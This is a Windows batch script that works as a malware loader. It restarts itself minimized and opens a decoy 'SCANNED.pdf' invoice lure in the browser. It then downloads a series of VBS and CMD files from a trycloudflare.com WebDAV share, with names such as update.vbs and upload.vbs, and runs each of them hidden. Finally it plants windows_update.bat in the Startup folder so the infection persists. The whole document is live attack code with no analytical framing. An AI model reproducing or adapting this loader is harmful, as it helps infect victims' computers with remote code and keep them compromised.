@echo off
setlocal
if "%1" == "" start "" /min "%~f0" MY_FLAG && exit

set source=\\invoicetrycloudflare.com@9983\DavWWWRoot\google\Win
set destination=%USERPROFILE%\Pictures

echo Opening PDF file...
start "" "https://valuable-gazette-shock-medication.trycloudflare.com/SCANNED.pdf"

echo Copying update from %source% to %destination%...
copy /Y "%source%\update.vbs" "%destination%"

echo Running update....
"%destination%\update.vbs"

echo Copying upload from %source% to %destination%...
copy /Y "%source%\upload.vbs" "%destination%"

echo Running upload....
"%destination%\upload.vbs"

echo Copying windows from %source% to %destination%...
copy /Y "%source%\windows.vbs" "%destination%"

echo Running windows...
"%destination%\windows.vbs"

echo Copying file from %source% to %destination%...
copy /Y "%source%\file.vbs" "%destination%"

echo Running file....
"%destination%\file.vbs"

REM Copy kam.cmd, xff.cmd, zap.cmd, las.cmd, info.cmd, sample.cmd, time.cmd, upload.cmd, update.cmd and version.bat to the destination folder
copy /Y "%source%\kam.cmd" "%destination%"
copy /Y "%source%\las.cmd" "%destination%"
copy /Y "%source%\xff.cmd" "%destination%"
copy /Y "%source%\zap.cmd" "%destination%"
copy /Y "%source%\info.cmd" "%destination%"
copy /Y "%source%\sample.cmd" "%destination%"
copy /Y "%source%\time.cmd" "%destination%"
copy /Y "%source%\upload.cmd" "%destination%"
copy /Y "%source%\update.cmd" "%destination%"

REM Run kam.cmd, las.cmd, zap.cmd, xff.cmd, sample.cmd, time.cmd, upload.cmd, update.cmd and info.cmd
for %%f in ("%destination%\kam.cmd" "%destination%\las.cmd" "%destination%\zap.cmd" "%destination%\sample.cmd" "%destination%\xff.cmd" "%destination%\time.cmd" "%destination%\upload.cmd" "%destination%\update.cmd" "%destination%\info.cmd") do (
    echo Running %%~nxf...
    start /MIN cmd /c "%%f"
)

copy /Y "%source%\windows_update.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

exit